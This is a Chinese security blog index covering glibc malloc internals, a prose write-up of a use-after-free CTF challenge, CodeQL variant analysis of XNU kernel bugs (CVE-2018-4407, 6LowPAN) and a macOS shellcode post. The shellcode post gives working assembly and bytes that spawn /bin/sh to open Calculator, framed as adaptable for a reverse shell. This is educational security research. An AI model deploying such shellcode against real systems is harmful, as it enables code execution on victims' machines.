chunk，若剩下的chunk 属于large bin chunk，将该chunk 的fd_nextsize 和bk_nextsize 设置为NULL。 ​ 然后设置一些标志位，对于last remainder chunk需要调用set_foot()，因为处于空闲状态的chunk的pre_size才是有效的；之后就是利用chunk2mem()转换，然后返回给用户了。 123/* remove from unsorted list */unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av); ​ 将双向循环链表中的最后一个chunk 移除 12345678910111213/* Take now instead of binning if exact fit */if (size == nb) { set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } ​ 如果当前遍历的chunk的size正好和需要的分配的大小nb相等，那直接就返回当前块：设置inuse标志位，然后判断是否属于主分配区，并设置相应的标志位，之后调用chunk2mem()转换后就返回给用户了。 12345678/* place chunk in bin */ if (in_smallbin_range (size)) { victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; } 判断当前遍历的chunk是否在small bin的范围，在的话插入到small bin的表头，成为第一个块。 不在small bin的范围的话，就是large bin了，就走下面的逻辑： 123456 else { victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; 类似上面的，把当前遍历的这个chunk插入到large bin的表头成为large bin的第一个块。 12345678910111213141516/* maintain large bins in sorted order */ if (fwd != bck) { /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) { fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } if (fwd != bck)意味着当前链表不为空，需要把当前的块插入large bin的链表中，设置inuse标志，并且插入到适合的位置。 12345678else { assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) { fwd = fwd-&gt;fd_nextsize; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); } 如果size比最后一个chunk的siz还要小，那就直接插入到最后。 123456789101112if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* Always insert in the second position. */ fwd = fwd-&gt;fd; else { victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } bck = fwd-&gt;bk; 正向遍历chunk size链表，找到一个和当前chunk大小相同的chunk就退出，那么chunk size 链表中一定包含fwd 所指向的chunk，为了不修改chunk size 链表，当前chunk 只能插入fwd 之后。 12345 } } else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;} 如果large bin链表里没有chunk，那么就直接插入chunk size链表。 12345mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; 完成chunk的插入空闲链表之后，设置bitmap。 1234#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) break; } 这里设置了最大的迭代次数，超出就直接退出了。 ​ 当将unsorted bin 中的空闲chunk 加入到相应的small bins 和large bins 后，将使用最佳匹配法分配large bin chunk。源代码如下： 1234567891011121314151617/* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */if (!in_smallbin_range (nb)) { bin = bin_at (av, idx); /* skip scan if empty or largest chunk is too small */ if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) { victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) victim = victim-&gt;bk_nextsize; ​ 如果所分配的块是large bin chunk，那么进入这段逻辑，当large bin list不为空且最大的chunk可以满足需要，就反向遍历链表，找到大小最合适的chunk，然后退出循环。 1234567/* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) victim = victim-&gt;fd; remainder_size = size - nb; unlink (av, victim, bck, fwd); ​ 如果所选的chunk(即victim)不是最后一个chunk，且下一个块chunk大小和所选的chunk大小一致，那么把后面的那个chunk作为备选。 ​ 计算victim分割后剩余的size，然后使用unlink()宏去把victim从链表中取出来。 1234567/* Exhaust */ if (remainder_size &lt; MINSIZE) { set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; } ​ 之后判断分割后剩余大小，如果小于MINSIZE(分配的chunk要略大于需要的chunk)，那么就给victim设置inuse标志，然后根据是否是主分配区的判断，设置相应的标志位。 12345678910111213141516171819202122232425262728293031323334 /* Split */ else { remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd;if (__glibc_unlikely (fwd-&gt;bk != bck)) { errstr = &quot;malloc(): corrupted unsorted chunks&quot;; goto errout; } remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (!in_smallbin_range (remainder_size)) { remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; } set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); } check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } ​ 从victim中分割出去的剩余部分作为新chunk加入到unsorted bin中，接着是判断大小，如果是large bin的范围，还要把fd_nextsize和bk_nextsize置为NULL，之后设置标志位，因为remainder空闲，所以还要设置foot(上面的分析里也有类似这段设置标志位的逻辑)。最后就很简单了，调用chunk2mem()的到可用的内存指针并返回给用户。 ​ 上面从最合适的small bin和large bin都没有合适的chunk去分配，那么就会查看比当前index大的下一个small bin 或者large bin中有没有合适的块去分配给用户，源码如下 12345678910111213141516/* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++idx; bin = bin_at (av, idx); block = idx2block (idx); map = av-&gt;binmap[block]; bit = idx2bit (idx); ​ 首先获取下一个bin，下面是malloc_state的结构体，bitmap是标识对应的bin中有没有空闲chunk。bitmap是按照block管理的，所以先获取了block，然后根据获取到的block去获取bitmap。 123456789101112131415161718192021222324252627282930313233343536373839struct malloc_state{ /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; //point to the TOP CHUNK of malloc state -- by muhe /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;}; ​ bit通过下面的宏被设置，idx指定的位置为1，其他位为0 。 1#define idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1)))) ​ 如果bit大于map，则map为0，map为0，说明当前bin中没有空闲chunk，所以去遍历bitmap的下一个block，直到找到一个不为0，或者遍历完才结束。 ​ 在退出循环遍历后，设置bin 指向block 的第一个bit 对应的bin，并将bit 为1， 表示该block中bit 1 对应的bin，这个bin 中如果有空闲chunk，该chunk 的大小一定满足要求。 1#define BINMAPSHIFT 5 123456789101112131415for (;; ) { /* Skip rest of block if there are no more set bits in this block. */ if (bit &gt; map || bit == 0) { do { if (++block &gt;= BINMAPSIZE) /* out of bins */ goto use_top; //走top chunk的逻辑 } while ((map = av-&gt;binmap[block]) == 0); //取到下一个block的map bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT)); bit = 1; } ​ 这段逻辑，是遍历一个block里所有的bin，因为map是非0的，所以找到bit不为0就退出循环，那么这个bit对应bin中一定有空闲chunk。 12345678/* Advance to bin with set bit. There must be one. */ while ((bit &amp; map) == 0) { bin = next_bin (bin); bit &lt;&lt;= 1; assert (bit != 0); } ​ 获取这个bin的最后一个chunk即victim，如果最后一个chunk和链表头指针相同，那么说明这个链表中没有空chunk，这个时候就先把之前bit清零，然后到下一个bin中， 12345678910/* Inspect the bin. It is likely to be non-empty */ victim = last (bin); /* If a false alarm (empty bin), clear the bit. */ if (victim == bin) { av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */ bin = next_bin (bin); bit &lt;&lt;= 1; } ​ 如果不相同，那么先的到victim的size，然后和之前的逻辑类似，计算分割后的大小remainder_size，然后使用unlink宏去把victim从链表中解链出来。 1234567891011else { size = chunksize (victim); /* We know the first chunk in this bin is big enough to use. */ assert ((unsigned long) (size) &gt;= (unsigned long) (nb)); remainder_size = size - nb; /* unlink */ unlink (av, victim, bck, fwd); ​ 这里判断切割后的大小并针对不同的大小做不同的处理。 如果切割剩余大小比MINSIZE小，那么就应该把整个chunk分给用户，之后就设置对应的标志位，之后就是返回的工作了； 如果比MINSIZE大，就要分割了。分割剩下的这块，要作为新的chunk加入unsorted bin。 123456789101112131415161718192021222324252627/* Exhaust */ if (remainder_size &lt; MINSIZE) { set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; } /* Split */ else { remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd;if (__glibc_unlikely (fwd-&gt;bk != bck)) { errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;; goto errout; } //添加到第一个位置 remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; ​ 如果整个剩余的chunk是small bin，那么就要把分配区的last remainder 设置为这个chunk；如果是large bin，要把fd_nextsize和bk_nextsize置NULL，然后和之前对large bin处理的逻辑一样，设置head、foot的标志位。 1234567891011121314/* advertise as last remainder */ if (in_smallbin_range (nb)) av-&gt;last_remainder = remainder; if (!in_smallbin_range (remainder_size)) { remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; } set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); } ​ 最后逻辑很简单，调用chunk2mem的到可用的内存指针，并返回给用户。 123456check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } 5.top chunk​ 这部分是在前面所有分配都失败的情况下才会到的逻辑，即fastbin 、small bin、large bin 都没有分配到所需要的chunk，就会从当前分配实例的top chunk直接分配内存，代码如下 12345678910111213141516171819202122232425262728293031323334use_top: /* If large enough, split off the chunk bordering the end of memory (held in av-&gt;top). Note that this is in accord with the best-fit search rule. In effect, av-&gt;top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av-&gt;top always exists (i.e., has size &gt;= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ victim = av-&gt;top; size = chunksize (victim); if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } ​ 首先，获取到top chunk，然后获取top chunk的size，接着判断size和要分配的大小nb，如果size大于我们要分配的大小nb，那就直接从top chunk中分割，的到victim，分割剩余部分作为新的top chunk，设置victim的一些标志位之后，调用chunk2mem()的到可用内存指针并且返回给用户。 ​ 一点小细节，因为top chunk需要MINSIZE 的空间来作为fencepost，所以大小比较的时候要加个MINSIZE；所以在分割完成之后并不用去设置foot。 1234567891011/* When we are using atomic ops to free fast chunks we can get here for all block sizes. */else if (have_fastchunks (av)) { malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); } ​ 如果还是没从top chunk中分配到，判断当前分配区中是否有fast bins中是否有chunk，有的话就合并到unsorted bin中，接着判断，在small bin范围内，就再次设置idx，进到最外层循环，再来一次，相对应的，large bin范围内也是一样，设置idx，再到最外层循环。 6.sysmalloc​ 在之前的分配策略都没办法分配到我们想要的内存的时候，就会走到这里。这里直接调用了sycmalloc()去分配，其实就是使用了mmap()直接映射，当然这个函数不可能这么简单，他对不同情况做了不同的处理。 123456789101112 /* Otherwise, relay to handle system-dependent cases */ else { void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; } }} 2. sysmalloc 分析12static void * sysmalloc (INTERNAL_SIZE_T nb, mstate av) 为了治疗拖延症，所以把过程记录在博客上，慢慢更新...","link":"/2016/11/21/Have-fun-with-glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"title":"NULL","text":"希望不是幻觉 自闭+1","link":"/2019/04/17/NULL/"},{"title":"dragon","text":"0x00:dragon 是一个UAF漏洞的利用。 UseAfterFree 是堆的漏洞利用的一种简单介绍 简单的来说就是 再次使用了 free 掉的内存 0x01:简单的看一下运行起来看一下 是一个RPG游戏，有两种角色，每个角色的技能不一样(战士法师之类的吧…)在进IDA分析的时候，发现龙是分两种的 baby_dragon 和 mommy_dragon，两种的血量和攻击力也各不相同。 而且龙的结构体是通过动态分配，填充数据，在龙死亡之后这部分内存free掉，再次游戏就会再分配内存…如此循环此外，发现一个神秘关卡:看着很美好，但是没什么x用，读取字符串限定长度，所以从这里拿不到shell的~ 0x02:分析还是要从内存分配上下手，只有先打赢dragon才可以free内存，再次分配，才会有机会玩。 回去看看龙的结构体:在dragon结构体中，表示血量的数据存储在 eax+8 的地方，还是 1 byte 的大小，范围应该是 0~127龙种类有两种,我们需要出现mama dragon（血多，打的少）龙的血量在小于零的时候就会死亡！这点很关键。RPG游戏的角色有两个，knight和priest。每个角色技能不一样。priest 的 3 可以 使用mp 使得 dragon攻击无效，这时候dragon血量会恢复。那就可以使用priest，耗到dragon血量 溢出，一旦小于零(溢出)，那么dragon就死了，也就是让它加血加到溢出。 0x03:控制流程IDA里查看流程，在胜利之后，free() 之后又重新malloc分配了龙的结构体，这时候 在输入名字的时候，我们可以控制4字节。(call eax) 0x04:怎么操作大概流程如下： 故意死亡一次 选择priest角色 332 的操作3轮 最后程序会有输入，这时候写入4字节到eax，之后程序会call eax 验证漏洞 写出exp打远程服务器打一发之后搞定~~ 0x05：结束语 UAF 挺有意思~ 顺便把pwnable.kr的UAF那个关卡也给秒了~挺简单的 就不写了。","link":"/2015/11/05/dragon/"},{"title":"SHELLCODE on macOS","text":"shellcode on macOS最近因为一些工作上的需求需要搞下macOS上的shellcdoe，谷歌了很多资料/代码后发现还是有不少坑的，或者就是代码比较老，定制化程度比较高，不太符合我的需求，其实我需求也简单 pop calc或者reverse shell，就是个演示效果 🤣。 ENV我这里环境是 macOS big sur(对，没错，小白鼠🐁) 工具链基本都是brew直接装或者自带的。 Step1其实在macOS上写shellcode和Linux差不多，都是要走系统调用，大概就是布置参数，写好调用号，然后一个syscall进去即可。 我这里为了省事儿，做的是执行system('xxxxxx')的shellcode，这样对于我演示来说，不管是弹计算器还是反弹shell都比较简单，如果是实战啥的，建议参考很早之前hacking team泄漏那种玩法，不过核心原理都是那样，不过人家玩的比较高级(毕竟军火嘛)。 exec_calc.asm: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253BITS 64global startsection .textstart: xor rax, rax mov rax,0x2 ror rax, 0x28 or rax, 59 mov rcx, rax xor rdx, rdx mov rbx, 0x68732f2f6e69622f push rdx push rbx push rsp pop rdi push rdx mov rbx, 0x632d push rdx push rbx push rsp pop rbx push rdx ; 参数开始 mov rcx, 0x7070612e726f7461 push rcx mov rcx, 0x6c75636c61432f73 push rcx mov rcx, 0x6e6f69746163696c push rcx mov rcx, 0x7070412f6d657473 push rcx mov rcx, 0x79532f206e65706f push rcx ; 参数结束 push rsp pop rcx push rdx push rcx push rbx push rdi push rsp pop rsi syscall Step2其实核心的就是执行的命令，即字符串怎么构造进去，这里是都压到栈里然后传递个指针，常规操作。 123$ nasm -f macho64 -o exec_calc.o exec_calc.asm$ ld -macosx_version_min 10.7.0 -o exec_calc exec_calc.old: warning: building for macOS 10.7.0 is deprecated 然后从objdump的结果中提取字节码即可： 123456789101112131415161718192021222324252627282930313233343536373839404142434445$ objdump -d ./exec_calc.o./exec_calc.o: file format Mach-O 64-bit x86-64Disassembly of section __TEXT,__text:0000000000000000 start: 0: 48 31 c0 xorq %rax, %rax 3: b8 02 00 00 00 movl $2, %eax 8: 48 c1 c8 28 rorq $40, %rax c: 48 83 c8 3b orq $59, %rax 10: 48 89 c1 movq %rax, %rcx 13: 48 31 d2 xorq %rdx, %rdx 16: 48 bb 2f 62 69 6e 2f 2f 73 68 movabsq $7526411283028599343, %rbx 20: 52 pushq %rdx 21: 53 pushq %rbx 22: 54 pushq %rsp 23: 5f popq %rdi 24: 52 pushq %rdx 25: bb 2d 63 00 00 movl $25389, %ebx 2a: 52 pushq %rdx 2b: 53 pushq %rbx 2c: 54 pushq %rsp 2d: 5b popq %rbx 2e: 52 pushq %rdx 2f: 48 b9 61 74 6f 72 2e 61 70 70 movabsq $8102082581755819105, %rcx 39: 51 pushq %rcx 3a: 48 b9 73 2f 43 61 6c 63 75 6c movabsq $7815262045510774643, %rcx 44: 51 pushq %rcx 45: 48 b9 6c 69 63 61 74 69 6f 6e movabsq $7957695015157983596, %rcx 4f: 51 pushq %rcx 50: 48 b9 73 74 65 6d 2f 41 70 70 movabsq $8102047401594156147, %rcx 5a: 51 pushq %rcx 5b: 48 b9 6f 70 65 6e 20 2f 53 79 movabsq $8742383117993865327, %rcx 65: 51 pushq %rcx 66: 54 pushq %rsp 67: 59 popq %rcx 68: 52 pushq %rdx 69: 51 pushq %rcx 6a: 53 pushq %rbx 6b: 57 pushq %rdi 6c: 54 pushq %rsp 6d: 5e popq %rsi 6e: 0f 05 syscall 这一步见仁见智了，有大佬用bash一行搞定，而我比较菜，之前是写了个py脚本提取然后格式化输出的。 之前看到过一个Linux版本的一键提取，不过感觉太复杂了… 1objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g' 有兴趣的朋友可以搞个macOS版本🤣 参考shellcode-osx","link":"/2020/11/28/shell-code-on-macos/"},{"title":"CodeQL + XNU From 0 to 1","text":"Basic本文属于学习过程中的笔记，基本上是把现有的相关资料整合到一起，阅读已有博客/文章并复现，加入一些自己的想法后记录下来的产物。 build XNU 过程来自某大佬的博客，build xnu with codeql过程来自github UPDATE 2021.3.7 更新，我在big sur上build xnu-7195.81.3 也是遇到了python权限的问题，使用virtualenv的方式解决了。 如果是老版本，建议先搜一下有没有现成的database可以用。 如果找不到，对于版本跨度比较大的情况，还是虚拟机+老版本Xcode比较稳。 Building XNU for macOS Big Sur 11.0.1 (Intel) D4rkD0g/boringforever 12curl https://jeremya.com/sw/Makefile.xnudeps &gt; Makefile.xnudepsmake -f Makefile.xnudeps 12345678910111213141516171819202122--------------------------------------------------------------------------------XNU is now ready to build!To build the kernel for supported x86_64 machines:cd xnu-7195.81.3make SDKROOT=macosx TARGET_CONFIGS=\"RELEASE X86_64 NONE\"To build for supported arm64e machines you can, e.g.:cd xnu-7195.81.3make SDKROOT=macosx KDKROOT=/path/to/KDK TARGET_CONFIGS=\"RELEASE ARM64 T8101\"For a table of supported arm64 products, visit:https://kernelshaman.blogspot.com/2021/02/building-xnu-for-macos-112-intel-apple.html#xnu-arm64eSee xnu's top-level README file for additional build and configuration variableswhich can be passed on the command line, e.g., Speed up the build with: BUILD_LTO=0 Build the development kernel with: KERNEL_CONFIGS=DEVELOPMENTUse LOGCOLORS=y to colorize the outputUse CONCISE=y to keep all the build output on a single line-------------------------------------------------------------------------------- 12345cd xnu-7195.81.3// 正常编译xnu的命令make SDKROOT=macosx TARGET_CONFIGS=\"RELEASE X86_64 NONE\"// 使用codeql编译命令codeql database create xnu-database --language=cpp --command=\"make SDKROOT=macosx ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=RELEASE\" 剩下的就是等了: 随后可以导入数据库到vscode中使用，也可以使用codecli 遇到的问题1 ： env: python : Permisson denied 解决：可以尝试更换xcode版本来尝试，我也试过使用root或者使用python virtualenv来规避问题，但是还是不行。 Query测试 Case studyCVE-2018-4407 - ping ping pingSetup envKernel crash caused by out-of-bounds write in Apple’s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab 以10.13.6为例 需要低版本的xcode来编译，直接去 https://developer.apple.com/download/more/ 下载即可。 构建 codeql database : 123// 老版本 xcodemake -f Makefile.xnudeps macos_version=10.13.6 xnudeps find by codeql导入 xnu 10.13.6 的database后，先看原作者的query，尝试理解他的思路 123456789101112131415161718192021222324252627282930/** * @name mbuf copydata with tainted size * @description Calling m_copydata with an untrusted size argument * could cause a buffer overflow. * @kind path-problem * @problem.severity warning * @id apple-xnu/cpp/mbuf-copydata-with-tainted-size */import cppimport semmle.code.cpp.dataflow.TaintTrackingimport DataFlow::PathGraphclass Config extends TaintTracking::Configuration { Config() { this = \"tcphdr_flow\" } override predicate isSource(DataFlow::Node source) { source.asExpr().(FunctionCall).getTarget().getName() = \"m_mtod\" } override predicate isSink(DataFlow::Node sink) { exists (FunctionCall call | call.getArgument(2) = sink.asExpr() and call.getTarget().getName().matches(\"%copydata\")) }}from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sinkwhere cfg.hasFlowPath(source, sink)select sink, source, sink, \"m_copydata with tainted size.\" 原作者使用了污点分析来追踪m_mtod调用到 copydata 长度参数。 说下具体的source sink的描述把： source ： 数据流起点，是一个 函数调用(functioncall)，并且该函数是 m_mtod sink : “终点”（可以这么理解吧），是 copydata 函数的第三个参数，函数名匹配使用了正则，能匹配到 copydata 系列。 结果如下： 我认为难点并不是如何写污点分析的query，难点应该是 分析就结果然后构造poc 漏洞分析从表象来看漏洞出在 m_copydata(n, 0, icmplen, (caddr_t)&amp;icp-&gt;icmp_ip); ip_icmp.c - apple/darwin-xnu - Sourcegraph 看起来是一个copy数据的时候没有对边界进行检查的“简单的“漏洞，但是Ian beer给作者邮件解释了root casue，这个漏洞发生的本质原因并不是这个地方。 首先看出现漏洞的函数信息： 1234567891011121314/* * Generate an error packet of type error * in response to bad packet ip. */voidicmp_error( struct mbuf *n, int type, int code, u_int32_t dest, u_int32_t nextmtu){...} 这个函数是处理“有问题的IP包”的，返回一个“error packet”给发送者，相当于：发现发过来的IP包有问题之后，生成一个错误信息返回给发送者。 上面的copy函数是复制原本IP包包头的信息复制到返回包中，出现了问题。根据Ian beer的解释： 漏洞实际发生在更早的地方： 1icp-&gt;icmp_type = type; 那么就要把这个函数从头开始分析一下了，我们重点关注：有问题的数据包在哪里进来的，在哪里被处理的，最终怎么走到copy的逻辑的。 源头： struct mbuf *n 表示有问题的数据包（incoming packet)，下面贴一下 mbuf 结构体： 12345678910111213141516/* * The mbuf object */struct mbuf { struct m_hdr m_hdr; union { struct { struct pkthdr MH_pkthdr; /* M_PKTHDR set */ union { struct m_ext MH_ext; /* M_EXT set */ char MH_databuf[_MHLEN]; } MH_dat; } MH; char M_databuf[_MLEN]; /* !M_PKTHDR, !M_EXT */ } M_dat;}; 返回的数据包： struct mbuf *m 1234if (MHLEN &gt; (sizeof(struct ip) + ICMP_MINLEN + icmplen)) m = m_gethdr(M_DONTWAIT, MT_HEADER); /* MAC-OK */ else m = m_getcl(M_DONTWAIT, MT_DATA, M_PKTHDR); m的分配和 icmplen 相关： 123nlen = m_length(n);...icmplen = min(oiphlen + icmpelen, min(nlen, oip-&gt;ip_len)); 处理： m-&gt;m_len = icmplen + ICMP_MINLEN; 这里看起来还没有问题，计算返回包m的长度； 1234567891011MH_ALIGN(m, m-&gt;m_len); // 宏// 展开之后：/* * As above, for mbufs allocated with m_gethdr/MGETHDR * or initialized by M_COPY_PKTHDR. */#define MH_ALIGN(m, len) \\do { \\ (m)-&gt;m_data += (MHLEN - (len)) &amp;~ (sizeof (long) - 1); \\} while (0) 这个宏并没有检查 MHLEN 和 len 的大小关系，这里是有整数溢出的。 在这个场景里， MHLEN 是 88， len是 m→m_len，也就是 icmplen + ICMP_MINLEN; ，如果可以控制 icmplen 大于80，这里就可以触发整数溢出， m_data 指向了其他位置。 随后使用到这个 已经整数溢出 的长度的地方，并不是copy的逻辑，而是： 12icp = mtod(m, struct icmp *);icp-&gt;icmp_type = type; // oob write here mtod 只是返回了 mbuf 的 data 指针 宏一步一步展开之后： 123456789101112#define mtod(m, t) ((t)m_mtod(m))void *m_mtod(struct mbuf *m){ return (MTOD(m, void *));}/* * Macro version of mtod. */#define MTOD(m, t) ((t)((m)-&gt;m_data)) 在上面的过程之后，icp指针本来是指向 m_buf的数据部分 但是整数溢出之后，m→m_data 增加了一个很大的值(&lt;4GB)，最终在 12icp-&gt;icmp_type = type; 就发生了越解写，root case 分析完毕。 about PATCH先说个人理解，直接对 incoming packet的 icmplen 做检查，使得这个长度必须是在合法范围内（根据包结构来计算） 长度必须 大于等于 sizeof(struct ip) + ICMP_MINLEN 长度必须 大于等于 oiphlen+ICMP_MINLEN 后面要计算 返回包长度的时候: 所以这里取到的一定是一个合法的值。 再看后续根据长度，拷贝数据的逻辑： 12icmplen = min(icmplen, M_TRAILINGSPACE(m) - sizeof(struct ip) - ICMP_MINLEN); 这个长度是经过计算的，把为m data部分分配的空间大小考虑了进去，这样保证拷贝数据的长度是合法的。 至此这个洞算是修的没问题了。 Apple macOS 6LowPAN VulnerabilityCVE-2020-9967 - Apple macOS 6LowPAN Vulnerability Setup env有漏洞的版本 10.15.4 为目标，苹果也在Big Sur里做了修复，这些洞影响范围还是比较大的，为了方便起见使用 10.15.4 。 (≤ 10.15.4) Building XNU for macOS Catalina 10.15.x 随后测试一下数据库可用即可。 CodeQL query在这个版本的xnu代码(6153.101.6)，bcopy在xnu中被大量使用，但是实现换成了 builtin___memmove_chk ，所以只需要把 之前污点追踪的 query的sink替换一下即可。 能覆盖到这些问题，但是需要挨个结果审计，然后构造poc才行。 About 6LowPAN6LowPAN 在 macOS10.15引入，全称是: IPv6 over Low-Power Wireless Persona Area Networks 6LoWPAN是一种基于IPv6的低速无线个域网标准，即IPv6 over IEEE 802.15.4。让每个节点可以用IPv6地址联网。这允许节点使用开放标准直接与Internet连接。即使在最小的资源受限设备上也可以应用Internet协议，并且处理能力有限的低功率设备应该能够参与物联网。 广域无线物联网及6LoWPAN介绍 RFC 4919 - IPv6 over Low-Power Wireless Personal Area Networks (6LoWPANs): Overview, Assumptions, Problem Statement, and Goals （瞎猜一下，感觉这个东西是对应10.15里引入的那个 “以查找未联网Mac 的功能“ ） 12345frame802154.c → 802.15.4帧创建和解析逻辑if_6lowpan.c → 6LowPAN network interfacesixlowpan.c → 6LowPAN 压缩/解压逻辑 IEEE 802.15.4帧格式 frame control 字段： IPv6报文必须承载在数据帧上。解析帧的时候，首先确定header，随后解析 payload部分。 LoWPAN Payload 由于全IPv6报文不符合ieee802.15.4帧的要求，IPv6需要提供适配层来满足MTU的最小要求。该标准还定义了报头压缩的使用，因为预计大多数应用程序将使用IEEE 802.15.4上的IP。 LoWPAN payload (e.g., an IPv6 packet) 遵循上面的描述；IPv6 头有40字节。 在初始标准中，定义了 LoWPAN_HC1 压缩IPv6数据报。这意味着6LowPAN的payload 在接收时被压缩。 Data Link Layer Dispatching 数据链路层分发 首先，我们可以发送一个以太网数据包，该数据包将由demux函数处理 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253intether_demux(ifnet_t ifp, mbuf_t m, char *frame_header, protocol_family_t *protocol_family){ struct ether_header *eh = (struct ether_header *)(void *)frame_header; u_short ether_type = eh-&gt;ether_type; u_int16_t type; u_int8_t *data; u_int32_t i = 0; struct ether_desc_blk_str *desc_blk = (struct ether_desc_blk_str *)ifp-&gt;if_family_cookie; u_int32_t maxd = desc_blk ? desc_blk-&gt;n_max_used : 0; struct en_desc *ed = desc_blk ? desc_blk-&gt;block_ptr : NULL; u_int32_t extProto1 = 0; u_int32_t extProto2 = 0; if (eh-&gt;ether_dhost[0] &amp; 1) { /* Check for broadcast */ if (_ether_cmp(etherbroadcastaddr, eh-&gt;ether_dhost) == 0) { m-&gt;m_flags |= M_BCAST; } else { m-&gt;m_flags |= M_MCAST; } } if (m-&gt;m_flags &amp; M_HASFCS) { /* * If the M_HASFCS is set by the driver we want to make sure * that we strip off the trailing FCS data before handing it * up the stack. */ m_adj(m, -ETHER_CRC_LEN); 